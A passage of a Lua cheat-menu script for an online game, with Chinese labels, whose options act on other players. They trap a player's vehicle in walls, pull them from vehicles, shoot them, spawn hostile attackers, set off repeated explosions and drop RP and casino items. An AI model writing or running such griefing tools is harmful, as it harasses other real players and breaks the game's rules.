			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = c.x - 6.5
			c.y = c.y - 6.5
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = c.x - 7.5
			c.y = c.y - 7
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = c.x - 14
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = c.x - 6.5
			c.y = c.y + 7
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = c.x - 7.5
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.x = c.x - 6.5
			c.y = c.y + 7
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y + 14
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y + 14
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y + 14
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			c.y = c.y - 3.1
			c.x = c.x + 5
			local spawnedwall = entities.create_object(wallbr, c)
			ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
			OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

			util.yield(500)
			TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
			util.yield(500)
			entities.delete_by_handle(veh)
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)

	toggleloop(player_vehicle, "禁用载具", {}, "", function(toggle)
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
		if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
			TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
		else
			local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
			entities.delete_by_handle(veh2)
		end
	end)

	action(player_vehicle, "卸载无敌载具", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local veh = PED.GET_VEHICLE_PED_IS_IN(p)
		if PED.IS_PED_IN_ANY_VEHICLE(p) then
			RequestControl(veh)
			ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)

	toggleloop(player_vehicle, "循环卸载无敌载具", {}, "", function(toggle)
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local veh = PED.GET_VEHICLE_PED_IS_IN(p)
		if PED.IS_PED_IN_ANY_VEHICLE(p) then
			RequestControl(veh)
			ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
		else
			util.toast(players.get_name(pid).. " 不在载具内")
		end
	end)


	action(damagelist, "狙击", {"snipe"}, "", function()
		local cam = CAM.GET_GAMEPLAY_CAM_COORD()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cam.x, cam.y, cam.z, c.x, c.y, c.z, 1000, 1, heavy, players.user_ped(), true, false, 2500.0)
	end)

	action(damagelist, "脉冲", {"atomize"}, "", function()
		local cam = CAM.GET_GAMEPLAY_CAM_COORD()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cam.x, cam.y, cam.z, c.x, c.y, c.z, 1000, 1, atomizer, players.user_ped(), true, false, 2500.0)
	end)

	action(damagelist, "脉冲波", {"launch"}, "", function()
		local cam = CAM.GET_GAMEPLAY_CAM_COORD()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p, false)
		local posx = c.x
		local posy = c.y
		local posz = c.z
		util.yield(10)
		for i = 1, 100 do
			MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(posx, posy, posz, c.x, c.y, c.z, 1000, 1, atomizer, players.user_ped(), true, false, 2500.0)
		end
		menu.trigger_commands("freeze" ..players.get_name(pid).. " on")
		util.yield(50)
		menu.trigger_commands("freeze" ..players.get_name(pid).. " off")
	end)

	action(damagelist, "火焰", {}, "生成火焰在他身上", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p, false)
		local posx = c.x
		local posy = c.y
		local posz = c.z + 1
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(posx, posy, posz, c.x, c.y, c.z, 1000, 1, molotov, players.user_ped(), true, false, 2500.0)
	end)


	local isImmortal = false
	local weapon0 = false
	local weapon1 = false
	local weapon2 = false
	local weapon3 = false
	local weapon4 = false
	local weapon5 = false
	local weapon6 = false
	local weapon7 = false
	local weapon8 = false
	local weapon9 = false
	local weapon10 = false
	local weapon11 = false

	toggle(attackers, "无敌", {}, "生成无敌的攻击者", function(toggle)
		isImmortal = toggle
	end)

	action(attackersweapons, "徒手", {}, "", function()
		weapon0 = true
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "砍刀", {}, "", function()
		weapon1 = true
		weapon0 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "手枪", {}, "", function()
		weapon2 = true
		weapon0 = false
		weapon1 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "电击枪", {}, "", function()
		weapon3 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "脉冲枪", {}, "", function()
		weapon4 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "霰弹枪", {}, "", function()
		weapon5 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "狙击步枪", {}, "", function()
		weapon6 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "冲锋枪", {}, "", function()
		weapon7 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "迷你枪", {}, "", function()
		weapon8 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon9 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "火箭筒", {}, "", function()
		weapon9 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon10 = false
		weapon11 = false
	end)

	action(attackersweapons, "地狱使者", {}, "", function()
		weapon10 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon11 = false
	end)

	action(attackersweapons, "爆炸枪", {}, "", function()
		weapon11 = true
		weapon0 = false
		weapon1 = false
		weapon2 = false
		weapon3 = false
		weapon4 = false
		weapon5 = false
		weapon6 = false
		weapon7 = false
		weapon8 = false
		weapon9 = false
		weapon10 = false
	end)

	local function GiveWeapon(attacker)
		if (weapon0 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(unarmed, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, unarmed, 1, false, true)
		elseif (weapon1 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(machete, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, machete, 1, false, true)
		elseif (weapon2 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(pistol, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, pistol, 1, false, true)
		elseif (weapon3 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(stungun, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, stungun, 1, false, true)
		elseif (weapon4 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(atomizer, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, atomizer, 1, false, true)
		elseif (weapon5 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(shotgun, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, shotgun, 1, false, true)
		elseif (weapon6 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(sniper, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, sniper, 1, false, true)
		elseif (weapon7 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(microsmg, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, microsmg, 1, false, true)
		elseif (weapon8 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(minigun, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, minigun, 1, false, true)
		elseif (weapon9 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(RPG, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, RPG, 1, false, true)
		elseif (weapon10 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(hellbringer, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, hellbringer, 1, false, true)
		elseif (weapon11 == true) then
			WEAPON.REQUEST_WEAPON_ASSET(railgun, 31, 0)
			WEAPON.GIVE_WEAPON_TO_PED(attacker, railgun, 1, false, true)
		end
	end

	local function setAttribute(attacker)
		PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 38, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 5, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 0, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 12, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 22, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 54, true)
		PED.SET_PED_COMBAT_RANGE(attacker, 4)
		PED.SET_PED_COMBAT_ABILITY(attacker, 3)
	end

	local tclone = {}
	local tchop = {}
	local tpogo = {}
	local tnaked = {}
	local theadless = {}
	local tcorpseless = {}
	local tclown = {}
	local tmime = {}
	local tjuggernaut = {}
	local tzombie = {}
	local tjesus = {}
	local tstripper = {}

	action(attackerslist, "克隆", {}, "生成克隆的玩家", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		aclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
		PED.CLONE_PED_TO_TARGET(p, aclone)
		GiveWeapon(aclone)
		setAttribute(aclone)
		TASK.TASK_COMBAT_PED(aclone, p, 0, 16)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(aclone, false)
		end
	end)

	action(attackerslist, "小查", {}, "生成宠物小查", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(chop)
		while not STREAMING.HAS_MODEL_LOADED(chop) do
			STREAMING.REQUEST_MODEL(chop)
			util.yield()
		end
		local achop = entities.create_ped(26, chop, c, 0) --spawn chop
		TASK.TASK_COMBAT_PED(achop , p, 0, 16)
		setAttribute(achop)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(achop , false)
		end
		if not STREAMING.HAS_MODEL_LOADED(chop) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "哈草太空猴", {}, "生成哈草太空猴", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(monkedude)
		while not STREAMING.HAS_MODEL_LOADED(monkedude) do
			STREAMING.REQUEST_MODEL(monkedude)
			util.yield()
		end
		local apogo = entities.create_ped(26, monkedude, c, 0) --spawn pogo
		TASK.TASK_COMBAT_PED(apogo, p, 0, 16)
		GiveWeapon(apogo)
		setAttribute(apogo)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(apogo, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(monkedude) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "利他邪教裸体", {}, "可以看到他的PP，LMFAOOOAOFAOFOAFOAOOOOO", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(nakeddude)
		while not STREAMING.HAS_MODEL_LOADED(nakeddude) do
			STREAMING.REQUEST_MODEL(nakeddude)
			util.yield()
		end
		local anaked = entities.create_ped(26, nakeddude, c, 0) --spawn weird ass mf
		TASK.TASK_COMBAT_PED(anaked, p, 0, 16)
		PED.SET_PED_DEFAULT_COMPONENT_VARIATION(anaked)
		GiveWeapon(anaked)
		setAttribute(anaked)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(anaked, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(nakeddude) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "无头", {}, "产生无头的NPC", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(headless)
		while not STREAMING.HAS_MODEL_LOADED(headless) do
			STREAMING.REQUEST_MODEL(headless)
			util.yield()
		end
		local aheadless = entities.create_ped(26, headless, c, 0) --spawn headless
		TASK.TASK_COMBAT_PED(aheadless, p, 0, 16)
		PED.SET_PED_DEFAULT_COMPONENT_VARIATION(aheadless)
		GiveWeapon(aheadless)
		setAttribute(aheadless)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(aheadless, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(headless) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "断肢尸体", {}, "生成断肢尸体", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(corpseless)
		while not STREAMING.HAS_MODEL_LOADED(corpseless) do
			STREAMING.REQUEST_MODEL(corpseless)
			util.yield()
		end
		local acorpseless = entities.create_ped(26, corpseless, c, 0) --spawn corpse less
		TASK.TASK_COMBAT_PED(acorpseless, p, 0, 16)
		PED.SET_PED_DEFAULT_COMPONENT_VARIATION(acorpseless)
		GiveWeapon(acorpseless)
		setAttribute(acorpseless)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(acorpseless, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(corpseless) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "小丑", {}, "生成小丑", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(clown)
		while not STREAMING.HAS_MODEL_LOADED(clown) do
			STREAMING.REQUEST_MODEL(clown)
			util.yield()
		end
		local aclown = entities.create_ped(26, clown, c, 0) --spawn clown
		TASK.TASK_COMBAT_PED(aclown, p, 0, 16)
		GiveWeapon(aclown)
		setAttribute(aclown)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(aclown, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(clown) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "哑巴", {}, "生成哑巴", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(mime)
		while not STREAMING.HAS_MODEL_LOADED(mime) do
			STREAMING.REQUEST_MODEL(mime)
			util.yield()
		end
		local amime = entities.create_ped(26, mime, c, 0) --spawn mime
		TASK.TASK_COMBAT_PED(amime, p, 0, 16)
		GiveWeapon(amime)
		setAttribute(amime)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(amime, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(mime) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "机器人", {}, "生成机器人", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(juggernaut)
		while not STREAMING.HAS_MODEL_LOADED(juggernaut) do
			STREAMING.REQUEST_MODEL(juggernaut)
			util.yield()
		end
		local ajuggernaut = entities.create_ped(26, juggernaut, c, 0) --spawn juggernaut
		TASK.TASK_COMBAT_PED(ajuggernaut, p, 0, 16)
		GiveWeapon(ajuggernaut)
		setAttribute(ajuggernaut)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(ajuggernaut, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(juggernaut) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "僵尸", {}, "生成僵尸", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(zombie)
		while not STREAMING.HAS_MODEL_LOADED(zombie) do
			STREAMING.REQUEST_MODEL(zombie)
			util.yield()
		end
		local azombie = entities.create_ped(26, zombie, c, 0) --spawn zombie
		TASK.TASK_COMBAT_PED(azombie, p, 0, 16)
		GiveWeapon(azombie)
		setAttribute(azombie)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(azombie, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(zombie) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "耶稣", {}, "生成耶稣", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(jesus)
		while not STREAMING.HAS_MODEL_LOADED(jesus) do
			STREAMING.REQUEST_MODEL(jesus)
			util.yield()
		end
		local ajesus = entities.create_ped(26, jesus, c, 0) --spawn jesus
		TASK.TASK_COMBAT_PED(ajesus, p, 0, 16)
		GiveWeapon(ajesus)
		setAttribute(ajesus)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(ajesus, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(jesus) then
			util.toast("无法加载模型!")
		end
	end)

	action(attackerslist, "脱衣舞娘", {}, "生成脱衣舞娘", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(stripper)
		while not STREAMING.HAS_MODEL_LOADED(stripper) do
			STREAMING.REQUEST_MODEL(stripper)
			util.yield()
		end
		local astripper = entities.create_ped(26, stripper, c, 0) --spawn stripper
		TASK.TASK_COMBAT_PED(astripper, p, 0, 16)
		GiveWeapon(astripper)
		setAttribute(astripper)
		if (isImmortal == true) then
			ENTITY.SET_ENTITY_CAN_BE_DAMAGED(astripper, false)
		end
		if not STREAMING.HAS_MODEL_LOADED(stripper) then
			util.toast("无法加载模型!")
		end
	end)

	action(prank, "给予通缉", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		local defz = c.z
		STREAMING.REQUEST_MODEL(copmodel)
		while not STREAMING.HAS_MODEL_LOADED(copmodel) do
			STREAMING.REQUEST_MODEL(copmodel)
			util.yield()
		end
		local success, floorcoords
		repeat
			success, floorcoords = util.get_ground_z(c.x, c.y)
			util.yield()
		until success
		c.z = floorcoords - 50
		local spawnedfloorwanted = entities.create_object(floorbr, c)
		floorcoords = floorcoords - 45
		c.z = floorcoords
		for i = 1, 100 do
			local spawnedcop1 = entities.create_ped(26, copmodel, c, 0)
			local spawnedcop2 = entities.create_ped(26, copmodel, c, 0)
			util.yield(500)
			FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, c.z, exp, 100.0, false, false, 0.0)
			util.yield(100)
			entities.delete_by_handle(spawnedcop1)
			entities.delete_by_handle(spawnedcop2)
		end
		entities.delete_by_handle(spawnedfloorwanted)
		util.toast("Done :)")
	end)

	toggleloop(prank, "循环卸车辆部件", {}, "", function(toggle)
		menu.trigger_commands("removedoors" .. players.get_name(pid))
		util.yield()
		menu.trigger_commands("detachwheel" .. players.get_name(pid))
		util.yield()
		menu.trigger_commands("repairveh" .. players.get_name(pid))
		util.yield(100)
	end)

	local actionf1 = false
	local actionf2 = false
	local actionf3 = false
	local actionf4 = true
	local actionf5 = false
	local actionf6 = false
	local actionf7 = false
	local actionf8 = false


	toggleloop(drops, "掉落经验", {"droprp"}, "", function(toggle)
		if (actionf1 == true) then
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(p)
			STREAMING.REQUEST_MODEL(alien)
			while not STREAMING.HAS_MODEL_LOADED(alien) do 
				STREAMING.REQUEST_MODEL(alien)
				util.yield()
			end
			OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, alien, true, false) --spawn figure
		elseif (actionf2 == true) then
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(p)
			STREAMING.REQUEST_MODEL(beast)
			while not STREAMING.HAS_MODEL_LOADED(beast) do 
				STREAMING.REQUEST_MODEL(beast)
				util.yield()
			end
			OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, beast, true, false) --spawn figure
		elseif (actionf3 == true) then
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(p)
			STREAMING.REQUEST_MODEL(impotent_rage)
			while not STREAMING.HAS_MODEL_LOADED(impotent_rage) do 
				STREAMING.REQUEST_MODEL(impotent_rage)
				util.yield()
			end
			OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, impotent_rage, true, false) --spawn figure
		elseif (actionf4 == true) then
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(p)
			STREAMING.REQUEST_MODEL(pogo)
			while not STREAMING.HAS_MODEL_LOADED(pogo) do 
				STREAMING.REQUEST_MODEL(pogo)
				util.yield()
			end
			OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, pogo, true, false) --spawn figure
		elseif (actionf5 == true) then
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(p)
			STREAMING.REQUEST_MODEL(princess_robot)
			while not STREAMING.HAS_MODEL_LOADED(princess_robot) do 
				STREAMING.REQUEST_MODEL(princess_robot)
				util.yield()
			end
			OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, princess_robot, true, false) --spawn figure
		elseif (actionf6 == true) then
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(p)
			STREAMING.REQUEST_MODEL(space_ranger)
			while not STREAMING.HAS_MODEL_LOADED(space_ranger) do 
				STREAMING.REQUEST_MODEL(space_ranger)
				util.yield()
			end
			OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, space_ranger, true, false) --spawn figure
		elseif (actionf7 == true) then
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(p)
			STREAMING.REQUEST_MODEL(space_ranger_2)
			while not STREAMING.HAS_MODEL_LOADED(space_ranger_2) do 
				STREAMING.REQUEST_MODEL(space_ranger_2)
				util.yield()
			end
			OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, space_ranger_2, true, false) --spawn figure
		elseif (actionf8 == true) then 
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(p)
			STREAMING.REQUEST_MODEL(bigfoot)
			while not STREAMING.HAS_MODEL_LOADED(bigfoot) do 
				STREAMING.REQUEST_MODEL(bigfoot)
				util.yield()
			end
			OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, bigfoot, true, false) --spawn figure
		else
			util.toast("选择一个人偶来生成")
			menu.trigger_commands("droprp" ..players.get_name(pid).. " off") --holy fuck this shit was aids to do
		end
	end)

	toggleloop(drops, "掉落赌场卡牌", {"dropchips"}, "", function(toggle)
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(card)
		while not STREAMING.HAS_MODEL_LOADED(card) do
			STREAMING.REQUEST_MODEL(card)
			util.yield()
		end
		OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, card, true, false) --spawn casino chips
		if not STREAMING.HAS_MODEL_LOADED(card) then
			util.toast("无法加载模型!")
		end
	end)

	toggleloop(drops, "掉落血包", {"drophealth"}, "", function(toggle)
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(health)
		while not STREAMING.HAS_MODEL_LOADED(health) do
			STREAMING.REQUEST_MODEL(health)
			util.yield()
		end
		OBJECT.CREATE_AMBIENT_PICKUP(healthpickup, pos.x, pos.y, pos.z, 0, false, health, true, false) --spawn health
		if not STREAMING.HAS_MODEL_LOADED(health) then
			util.toast("无法加载模型!")
		end
	end)

	toggleloop(drops, "掉落载具维修", {"dropvehhealth"}, "", function(toggle)
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(vehicledrop)
		while not STREAMING.HAS_MODEL_LOADED(vehicledrop) do
			STREAMING.REQUEST_MODEL(vehicledrop)
			util.yield()
		end
		OBJECT.CREATE_AMBIENT_PICKUP(vehiclepickup, pos.x, pos.y, pos.z, 0, false, vehicledrop, true, false) --spawn veh health
		if not STREAMING.HAS_MODEL_LOADED(vehicledrop) then
			util.toast("无法加载模型!")
		end
	end)

